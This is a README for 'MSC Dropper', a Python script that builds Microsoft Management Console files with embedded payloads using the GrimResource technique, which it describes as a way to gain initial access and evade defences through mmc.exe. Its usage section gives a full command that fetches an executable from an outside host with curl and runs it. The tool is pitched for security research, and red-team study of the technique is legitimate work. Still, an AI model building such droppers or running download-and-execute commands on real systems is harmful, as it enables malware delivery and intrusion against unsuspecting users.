# MSC Dropper Tool

MSC Dropper is a Python script designed to automate the creation of MSC (Microsoft Management Console) files with customizable payloads for arbitrary execution. This tool leverages a method discovered by Samir (@SBousseaden) from Elastic Security Labs, termed #GrimResource, which facilitates initial access and evasion through `mmc.exe`.

## Overview

The script allows users to generate MSC files that can execute arbitrary commands or scripts within the Microsoft Management Console environment. This capability is particularly useful for security research and testing environments.

## Features

- **Automated MSC File Generation**: Create MSC files with specified commands or scripts embedded.
- **Payload Customization**: Customize the payload to execute any command or script that `mmc.exe` can invoke.
- **Command-Line Interface**: Simple command-line interface for quick generation of MSC files.

## Installation

Clone the repository:

   ```bash
   git clone https://github.com/your-username/msc-dropper.git
   ```

## Usage

### Generating an MSC File

To generate an MSC file with a specific command or script:

```bash
python msc_dropper.py template1.msc out.msc "cmd /c curl -O http://wslab.de/tools/messagebox.exe && messagebox.exe"
```

Replace `"cmd /c curl -O http://wslab.de/tools/messagebox.exe && messagebox.exe"` with the command or script you want to execute. Ensure that the command is formatted correctly to work within the Windows environment and `mmc.exe`.

### Customizing Payloads

You can customize the payload directly within the `template1.msc` file or modify the script to automate more complex payload generation.

## Contributing

Contributions are welcome! Please fork the repository and submit pull requests.

## Credits

- Samir (@SBousseaden) from Elastic Security Labs for discovering the initial access and evasion method involving `mmc.exe`.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
